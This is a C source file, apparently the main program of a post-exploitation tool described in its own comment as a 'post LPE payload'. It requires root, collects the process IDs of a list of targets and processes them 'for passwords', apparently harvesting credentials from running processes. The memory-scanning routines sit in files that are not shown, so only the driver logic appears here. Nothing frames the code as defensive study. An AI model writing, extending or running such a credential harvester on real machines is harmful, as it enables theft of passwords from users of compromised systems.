#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include "dbg.h"
#include "targets.h"
#include "scanner.h"

int main(int argc, char *argv[])
{
    Target targets[MAX_TARGETS];

    // Must be root (this is a post LPE payload!)
    if ( getuid() != 0 )
    {
        printf("[!!] MUST BE ROOT\n");
        return -1;
    }
    // Initialize targets
    memset(targets, 0, sizeof(targets));
    initTargets(targets);

    // Populate targets with pids
    getTargetPids(targets);

#ifdef DEBUG
    dumpTargets(targets);
#endif

    // Process targets for passwords
    if ( processTargets(targets) < 0 )
    {
        log_error("Failed to process targets");
        return -1;
    }

    return 0;
}

